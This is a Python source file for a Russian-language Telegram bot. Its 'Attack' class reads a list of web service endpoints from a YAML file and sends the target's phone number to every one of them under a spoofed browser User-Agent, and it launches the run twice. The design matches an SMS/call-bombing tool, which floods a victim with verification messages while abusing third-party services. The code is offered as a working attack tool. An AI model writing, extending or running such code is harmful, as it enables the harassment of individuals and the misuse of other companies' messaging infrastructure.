from json import loads
from pathlib import Path
from aiohttp import ClientSession

import yaml
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

from request.api import API

SERVICES_FOLDER = Path(__file__).resolve().parents[2]

api = API()


class Attack:
    def __init__(self):
        self.session: ClientSession = ClientSession()
        self.headers = {"User-Agent": (
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/93.0.4577.63 Safari/537.36"),
            "Accept": "*/*"}

    async def attack(self, message: Message, phone: int):
        await self.start_process(phone)
        response = api.run_attack(message.from_user.id, phone)
        attack_id = response.get("id")
        attack_uuid = response.get("uuid")
        if not attack_id:
            return await message.answer("Данная атака уже существует!")
        await self.start_process(phone)
        page = (F"Атака началась <b>#{attack_id}</b>")
        reply_markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="Остановить", callback_data=F"stop#{attack_uuid}")]
        ])
        return await message.answer(page, reply_markup=reply_markup)

    async def start_process(self, phone: int):
        services = self.load_services()
        for k, v in services.items():
            try:
                if not v["formating"]:
                    if "data" in v:
                        data = (v["data"] %
                                phone).replace("'", "\"")
                        await self.session.post(url=k, data=loads(data),
                                                headers=self.headers, timeout=3)
                    elif "json" in v:
                        json = (v["json"] %
                                phone).replace("'", "\"")
                        await self.session.post(url=k, json=loads(json),
                                                headers=self.headers, timeout=3)
                else:
                    await self.session.post(url=k % phone, timeout=3)
            except TypeError:
                pass
            except Exception as e:
                pass

    def load_services(self):
        with open(rF"{SERVICES_FOLDER}\services.yaml", "r") as f:
            services = yaml.load(f, Loader=yaml.FullLoader)
            return services
